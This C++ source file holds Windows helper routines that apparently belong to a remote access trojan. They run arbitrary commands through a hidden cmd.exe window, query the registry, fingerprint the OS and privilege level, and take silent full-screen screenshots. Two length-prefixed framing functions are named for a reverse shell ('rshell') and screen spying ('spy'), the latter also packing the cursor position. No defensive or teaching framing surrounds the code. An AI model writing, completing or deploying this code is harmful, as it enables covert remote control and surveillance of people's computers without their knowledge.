#include <windows.h>
#include <sstream>
#include <direct.h>
#include <gdiplus.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "gdiplus")

extern "C" {
    NTSYSAPI NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOEXW lpVersionInformation);
}

std::string exec_cmd(const std::string& command) {
    if (command.substr(0, 3) == "cd ") {
        std::string path = command.substr(3);

        int result = _chdir(path.c_str());

        if (result == 0) {
            if (path == "..") {
                return "Moved up a directory.\n";
            } else if (path == "/") {
                return "Moved to root.\n";
            } else {
                return "Moved to " + path + "\n";
            }
        } else {
            return "Couldn't move to " + path + "\n";
        }
    }

    if (command == "powershell") {
        return "To run PowerShell commands, please type them after \"powershell\".\n";
    }

    if (command.substr(0, 3) == "cmd") {
        return "You are already running commands in a command prompt.\n";
    }

    std::string output;

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;

    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);

    STARTUPINFO si = { sizeof(STARTUPINFO) };

    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi;
    CreateProcess(NULL, (LPSTR)("cmd.exe /C " + command).c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hWritePipe);
    char buffer[1024];

    DWORD bytesRead;
    HANDLE hProcess = pi.hProcess;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        output.append(buffer, bytesRead);
    }

    DWORD ret = WaitForSingleObject(hProcess, 10000);

    if (ret == WAIT_TIMEOUT) {
        TerminateProcess(hProcess, 0);
        return "Command timed out after 10 seconds.\n";
    }

    // WaitForSingleObject(hProcess, INFINITE);

    CloseHandle(hReadPipe);
    CloseHandle(hProcess);
    CloseHandle(pi.hThread);

    if (output.empty()) {
        return "Command sucessfully executed.\n";
    } else {
        std::replace(output.begin(), output.end(), 'ÿ', ' ');
        return output;
    }
}

std::string query_registry(std::string path, std::string key, std::string arch) {
    HKEY hKey;
    auto archflag = arch == "x64" ? KEY_WOW64_64KEY : KEY_WOW64_32KEY;
    std::string reg = path.substr(0, path.find("\\"));

    if (reg == "HKEY_CLASSES_ROOT") {
        hKey = HKEY_CLASSES_ROOT;
    } else if (reg == "HKEY_CURRENT_USER") {
        hKey = HKEY_CURRENT_USER;
    } else if (reg == "HKEY_LOCAL_MACHINE") {
        hKey = HKEY_LOCAL_MACHINE;
    } else if (reg == "HKEY_USERS") {
        hKey = HKEY_USERS;
    } else if (reg == "HKEY_CURRENT_CONFIG") {
        hKey = HKEY_CURRENT_CONFIG;
    } else {
        return std::string();
    }

    path.erase(0, path.find("\\") + 1);

    LONG result = RegOpenKeyExW(hKey, std::wstring(path.begin(), path.end()).c_str(), 0, KEY_READ | archflag, &hKey);

    if (result != ERROR_SUCCESS)
        return std::string();

    const DWORD bufferSize = 255;
    BYTE buffer[bufferSize] = { 0 };

    DWORD cbData = bufferSize;
    result = RegGetValueW(hKey, NULL, std::wstring(key.begin(), key.end()).c_str(), RRF_RT_ANY, NULL, buffer, &cbData);

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS)
        return std::string();

    char* ascii = new char[bufferSize];
    wcstombs(ascii, (wchar_t*)buffer, bufferSize);

    return ascii;
}

std::string get_architecture() {
    SYSTEM_INFO system_info;
    GetNativeSystemInfo(&system_info);

    if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
        return "x64";
    else
        return "x86";
}

std::string get_windows_version() {
    std::string windows_version;

    RTL_OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);

    RtlGetVersion(&osvi);

    if (osvi.dwMajorVersion == 10 && osvi.dwBuildNumber > 22000)
        windows_version = "Windows 11";
    else if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0)
        windows_version = "Windows 10";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3)
        windows_version = "Windows 8.1";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)
        windows_version = "Windows 8";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
        windows_version = "Windows 7";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
        windows_version = "Windows Vista";
    else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
        windows_version = "Windows XP";
    else
        windows_version = "Unknown Windows";

    if (get_architecture() == "x64")
        windows_version += " (64-bit)";
    else
        windows_version += " (32-bit)";

    return windows_version;
}

bool file_or_dir_exists(std::string path) {
    struct _stat32 info;

    if (_stat32(path.c_str(), &info) == 0) {
        return true;
    }
    else {
        return false;
    }
}

std::list<std::string> get_directories(const std::string& s) {
    std::list<std::string> r;

    for (auto& p : std::filesystem::directory_iterator(s))
        if (p.is_directory())
            r.push_back(p.path().string());

    return r;
}

BOOL is_elevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        goto Cleanup;
    }


    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        goto Cleanup;
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

int get_encoder_clsid(const WCHAR* format, CLSID* pClsid) {
    using namespace Gdiplus;
    UINT  num = 0;
    UINT  size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);

    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));

    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return 0;
}

std::vector<unsigned char> screenshot_jpeg() {
    using namespace Gdiplus;

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;

    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC     hScreen = GetDC(NULL);
    HDC     hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    Gdiplus::Bitmap* bitmap = new Gdiplus::Bitmap(hBitmap, NULL);
    CLSID clsid;
    get_encoder_clsid(L"image/jpeg", &clsid);

    std::vector<unsigned char> data;
    IStream* stream = NULL;

    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK) {
        if (bitmap->Save(stream, &clsid) == S_OK) {
            HGLOBAL hglobal;
            if (GetHGlobalFromStream(stream, &hglobal) == S_OK) {
                data.resize(GlobalSize(hglobal));
                unsigned char* p = (unsigned char*)GlobalLock(hglobal);
                if (p) {
                    memcpy(data.data(), p, data.size());
                    GlobalUnlock(hglobal);
                }
            }
        }
        stream->Release();
    }

    delete bitmap;
    SelectObject(hDC, old_obj);
    DeleteObject(hDC);
    DeleteObject(hBitmap);
    ReleaseDC(0, hScreen);

    GdiplusShutdown(gdiplusToken);

    return data;
}

std::vector<BYTE> bytevector_rshell(std::string data) {
    std::vector<BYTE> output;

    output.reserve(4 + data.length());

    output.insert(output.end(), (data.length() & 0xff000000) >> 24);
    output.insert(output.end(), (data.length() & 0x00ff0000) >> 16);
    output.insert(output.end(), (data.length() & 0x0000ff00) >> 8);
    output.insert(output.end(), data.length() & 0x000000ff);

    output.insert(output.end(), data.begin(), data.end());

    return output;
}

std::vector<BYTE> bytevector_spy(std::string data) {
    std::vector<BYTE> output;

    output.reserve(4 + 2 + 2 + data.length());

    output.insert(output.end(), (data.length() & 0xff000000) >> 24);
    output.insert(output.end(), (data.length() & 0x00ff0000) >> 16);
    output.insert(output.end(), (data.length() & 0x0000ff00) >> 8);
    output.insert(output.end(), data.length() & 0x000000ff);

    POINT cursor;
    int x, y;

    if (GetCursorPos(&cursor)) {
        x = cursor.x;
        y = cursor.y;
    } else {
        x = 0;
        y = 0;
    }

    output.insert(output.end(), (x & 0xff00) >> 8);
    output.insert(output.end(), x & 0x00ff);

    output.insert(output.end(), (y & 0xff00) >> 8);
    output.insert(output.end(), y & 0x00ff);

    output.insert(output.end(), data.begin(), data.end());

    return output;
}
